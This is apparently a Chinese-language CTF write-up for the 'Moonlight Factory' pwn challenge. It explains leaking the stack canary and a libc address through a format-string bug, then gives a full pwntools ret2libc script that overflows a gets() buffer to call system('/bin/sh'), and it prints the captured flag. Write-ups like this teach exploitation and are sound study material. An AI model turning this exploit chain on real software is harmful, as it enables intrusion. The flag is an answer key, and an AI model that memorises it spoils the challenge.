# Greycademy2025 Moonlight Factory

## 题目简述

程序先把用户字符串直接交给 `printf`，随后又用 `gets` 读入 8 字节栈缓冲区。二进制启用了 Full RELRO、Canary、NX、PIE 和 ASLR，必须先利用格式化字符串泄漏 Canary 与 libc 地址，再构造 ret2libc。

## 解题过程

两个漏洞点连续出现：

```c
char printf_buffer[32];
char overflow_buffer[8];

fgets(printf_buffer, 31, stdin);
printf(printf_buffer);
gets(overflow_buffer);
```

对随附环境逐个查看栈参数，`%13$p` 是以 `00` 结尾的 Canary，`%15$p` 是返回到 libc 的地址。一次输入即可同时泄漏：

```text
%13$p.%15$p
```

官方容器对应的 libc 中，这个返回地址相对 libc 基址的偏移是 `0x2a1ca`，所以：

```python
canary, libc_leak = [int(x, 16) for x in leak_line.split(".")]
libc.address = libc_leak - 0x2a1ca
```

从 `overflow_buffer` 到 Canary 的偏移为 `0x30`。恢复 Canary、跳过保存的 RBP 后，使用随附 libc 内的 `pop rdi; ret`、`/bin/sh` 和 `system`：

```python
from pwn import *

exe = ELF("./moonlightfactory")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

p = process([ld.path, "--library-path", ".", exe.path])
p.sendlineafter(b"printf payload > ", b"%13$p.%15$p")

canary, libc_leak = map(
    lambda x: int(x, 16),
    p.recvline().strip().split(b"."),
)
libc.address = libc_leak - 0x2a1ca

rop = ROP(libc)
rop.rdi = next(libc.search(b"/bin/sh"))
rop.raw(rop.find_gadget(["ret"]).address)
rop.raw(libc.sym.system)

payload = b"A" * 0x30 + p64(canary) + p64(0) + rop.chain()
p.sendlineafter(b"overflow payload > ", payload)
p.interactive()
```

本地用题目附带 loader/libc 复现后取得：

```text
grey{I am a beacon of knowledge blazing out across a black sea of ignorance!!!}
```

## 方法总结

完整保护并不阻止利用，而是要求先解决未知地址和 Canary。格式化字符串负责信息泄漏，`gets` 负责控制流覆盖，两者形成互补链。libc 泄漏偏移、gadget 和符号都必须基于远端对应的 libc；直接用宿主 glibc 会让地址计算失效。ROP 中额外的 `ret` 用来满足调用 `system` 前的栈对齐。
